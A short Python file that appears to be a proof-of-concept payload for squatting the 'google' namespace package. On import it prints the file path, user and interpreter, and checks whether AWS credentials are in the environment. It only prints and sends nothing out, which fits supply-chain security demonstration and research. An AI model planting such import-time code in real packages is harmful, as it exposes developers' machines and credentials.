"""
Payload lives directly in the squatted namespace root.
"""

import os
import sys


# Payload execution on namespace import.
print("[*] Malicious google namespace package initialized")
print(f"[*] Code executing in: {__file__}")
print(f"[*] Current user: {os.getenv('USER', 'unknown')}")
print(f"[*] Python interpreter: {sys.executable}")

aws_key = os.getenv("AWS_ACCESS_KEY_ID")
if aws_key:
    print("[!] Found AWS credentials in environment")

print("[*] This code runs every time the google package is imported")
